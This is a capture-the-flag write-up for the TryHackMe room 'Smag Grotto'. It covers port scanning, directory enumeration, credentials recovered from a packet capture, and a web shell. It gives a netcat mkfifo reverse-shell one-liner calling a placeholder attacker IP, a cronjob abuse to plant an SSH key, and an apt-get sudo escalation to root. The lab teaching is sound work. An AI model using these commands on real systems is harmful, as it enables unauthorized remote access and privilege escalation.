# Smag Grotto  
![alt text](https://i.imgur.com/Hf7abh7.png)   
TryHackMe Easy [Room](https://tryhackme.com/room/smaggrotto)

## Nmap Scan
We will discover port 22 and 80 are open.   
```bash
PORT      STATE    SERVICE        REASON      VERSION
22/tcp    open     ssh            syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDORe0Df8XvRlc3MvkqhpqAX5/sbUoEiIckKSVOLJVmWb9jOq2r0AfjaYAAZzgH9RThlwbzjGj6r4yBsXrMFB01qemsYBzUkut9Q12P+uly9+SeL6X7CUavLnkcAz0bzkqQpIFLG9HUyu9ysmZqE1Xo6NumtNh3Bf4H1BbS+cRntagn1TreTWJUiT+s7Gr9KEIH7rQUM8jX/eD/zNTKMN9Ib6/TM7TkPxAnOSw5JRfTV/oC8fFGqvjcAMxlhqS44AL/ZziI50OrCX9rMKtjZuvPaW2U31Sr8nUmtd3jnJPjMH2ZRfeRTPybYOblPOZq5lV2Fu4TwF/xOv2OrACLDxj5
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN6hWP9VGah8N9DAM3Kb0OZlIEttMMjf+PXwLWfHf0dz6OtdbrEjblgrck0i7fT95F1qdRJHtBdEu5yg4r6/gkY=
|   256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWHQ800Vx/X5aGSIDdpkEuKgFDxnjak46F/IsegN2Ju
80/tcp    open     http           syn-ack     Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Smag
```

## Web Enum
- Gobuster 
By running gobuster we will find `/mail` directory
    ```bash
    =====================================================
    Gobuster v2.0.1              OJ Reeves (@TheColonial)
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://smag.thm/
    [+] Threads      : 10
    [+] Wordlist     : /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
    [+] Status codes : 200,204,301,302,307,403
    [+] Timeout      : 10s
    =====================================================
    2020/07/30 10:18:48 Starting gobuster
    =====================================================
    /mail (Status: 301)
    ```
Going to `/mail` will give us access to a conversation that includes a `.pcap` file.   
- The page
![alt text](https://i.imgur.com/Hf7abh7.png)   

## Wireshark
Taking a good look at the traffic, we can find an HTTP Post request to development.smag.thm/login.php. In the packet, we can see the username and pass in clear text.   
![alt text](https://i.imgur.com/mysFlTm.png)   
with the credential, we can go to `development.smag.thm` and try to get access to `/admin.php`.   


## Getting In
Add development.smag.thm to your `/etc/hosts` and access it through browser.   
- /etc/hosts
    ```bash
    127.0.0.1	localhost
    127.0.1.1	reza-HP-Spectre
    172.16.122.129	hekerendonesa
    10.10.228.117	smag.thm	development.smag.thm
    10.10.70.17	windcorp.thm	fire.windcorp.thm
    172.16.122.130	nugroho-server
    ```
- Acessing `development.smag.thm`   
![alt text](https://i.imgur.com/2rWGPce.png)   
log in with credential we get from the `.pcap` file and we will be redirected to `admin.php`   
![alt text](https://i.imgur.com/3lUPoZp.png)   
Here we have a web shell that will not print out the output of the command, so we can just execute a reverse shell command   
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> <PORT> >/tmp/f`   
And we will have access to the machine as `www-data`   
![alt text](https://i.imgur.com/QDnuKv9.png)

## Getting Access to Jake
- Enum
I tried to use [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to find Priv Esc vector and found that there is an interesting cronjob.   
    ```bash
    SHELL=/bin/sh
    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
    
    # m h dom mon dow user	command
    17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
    25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    *  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys <--- We can abuse this
    ```
from that, we know that we can change the content of `/opt/.backups/jake_id_rsa.pub.backup` from jake's public key to our public key.   
After changing that, we can access jake's account with no password.   
![alt text](https://i.imgur.com/WgpnqsN.png)   

## Getting to Root
From the moment i get access to user `jake`, the first thing i tried is to check jake's sudo cprivilege with the command `sudo -l`.  
And here's what i got 
```bash
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```
So just go to GTFOBins and find `apt-get`   
![alt text](https://i.imgur.com/qd1AJlB.png)   
Just run `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` and you will get root shell.   
![alt text](https://i.imgur.com/4dXK1YU.png)

# HAPPY HACKING!!!
